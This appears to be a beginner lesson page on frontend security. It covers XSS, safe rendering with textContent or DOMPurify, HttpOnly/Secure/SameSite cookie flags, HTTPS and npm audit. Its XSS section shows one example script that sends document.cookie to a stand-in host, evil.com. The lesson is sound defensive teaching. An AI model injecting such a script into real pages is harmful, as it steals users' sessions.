---
title: Frontend Security
order: 7
estMinutes: 15
difficulty: easy
checklist:
  - Distinguish stored, reflected, and DOM-based XSS attacks
  - Configure Content Security Policy headers to prevent XSS
  - Understand CSRF and how SameSite cookies mitigate it
  - Identify which HTTP security headers to set and why
  - Audit third-party dependencies for known vulnerabilities
---

The frontend runs in your users' browsers, handling their data and login sessions — which makes it a target. You don't need to be a security expert, but a few key defenses prevent the most common (and most damaging) attacks.

## The big one: XSS (Cross-Site Scripting)

**XSS** is when an attacker sneaks their own JavaScript onto your page, where it runs with full access to your user's session. Imagine a comment box where someone posts this:

```html
<script>fetch('https://evil.com/?c=' + document.cookie)</script>
```

If you display that comment as raw HTML, that script runs for everyone who views it — stealing their data.

**The defense:** never drop user-provided text into the page as HTML. Use `textContent`, which shows it as plain text, not code:

```ts
// ❌ dangerous — runs any HTML/script the user typed
el.innerHTML = userInput

// ✅ safe — shows it as literal text
el.textContent = userInput
```

> [!CAUTION]
> The dangerous spots are `innerHTML`, `document.write()`, and `eval()`. Avoid feeding user input into these. If you *must* render user HTML, clean it first with a library like **DOMPurify**.

## Protect login cookies

If you use cookies for login, add these safety flags:

- **`HttpOnly`** — JavaScript can't read the cookie, so even an XSS attack can't steal the login token.
- **`Secure`** — only sent over HTTPS.
- **`SameSite=Lax`** — not sent to other sites, which blocks a trick called **CSRF** (where a malicious site tries to make requests using your logged-in session).

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

## Always use HTTPS

HTTPS encrypts traffic so nobody can snoop or tamper with it in transit. It's non-negotiable for any real site — and it's free (Let's Encrypt, or built into hosts like Vercel/Netlify).

## Check your dependencies

Your app pulls in lots of third-party packages, and sometimes those have known security holes. Scan them regularly:

```bash
npm audit          # lists known vulnerabilities
```

Run it in your CI so a risky package fails the build.

## In one sentence

The top frontend risk is **XSS** — never put user input into `innerHTML` (use `textContent` or DOMPurify) — plus protect login cookies with `HttpOnly`/`Secure`/`SameSite`, always use HTTPS, and scan dependencies with `npm audit`.

## Want to go deeper?

Switch to **Expert** mode above for the XSS types, Content Security Policy, CSRF tokens, the full security-header set, and supply-chain tooling.
